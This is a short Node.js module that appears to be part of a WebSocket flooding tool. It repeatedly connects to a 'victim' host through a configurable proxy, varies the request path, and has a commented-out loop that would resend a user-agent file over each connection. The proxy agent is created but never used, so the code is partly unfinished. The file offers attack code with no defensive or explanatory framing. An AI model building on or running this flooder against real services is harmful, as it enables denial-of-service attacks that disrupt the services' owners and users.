let WebSocketClient = require('websocket').client;
var tunnel = require('tunnel');
const fs = require('fs')
const {
    exec
} = require('child_process');
let index = 0
function randInteger(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    rand = Math.round(rand);
    return rand;
}

class xoxo {
    constructor(userAgents, callback) {
        this.userAgents = userAgents;

        this.isRunning = false;
    }

    start(props) {
        this.isRunning = true;
        if (this.isRunning) {
            let client = new WebSocketClient();
            let tunnelingAgent = tunnel.httpOverHttp({
                proxy: {
                    host: props.proxy.host,
                    port: props.proxy.port
                }
            });

            let requestOptions = {
                agent: tunnelingAgent
            };


            client.connect(props.victim.host + `/${index++}`, null, null, null, );

            client.on('connectFailed', function (error) {
                // console.log('Connect Error: ' + error.toString());
            });

            client.on('connect', function (connection) {
                console.log(index);
                connection.on('error', function (error) { // 连接失败
                    //console.log("Connection Error: " + error.toString());
                });
                connection.on('close', function () {
                    //console.log('echo-protocol Connection Closed');
                });
                connection.on('message', function (message) {

                    console.log(message)

                });
                connection.close()

                //for (let j = 0; j < 15; j++) {
                    //connection.send(fs.readFileSync('ua.txt', 'utf-8'));
                //}
            });

        }
    }
}



module.exports = xoxo;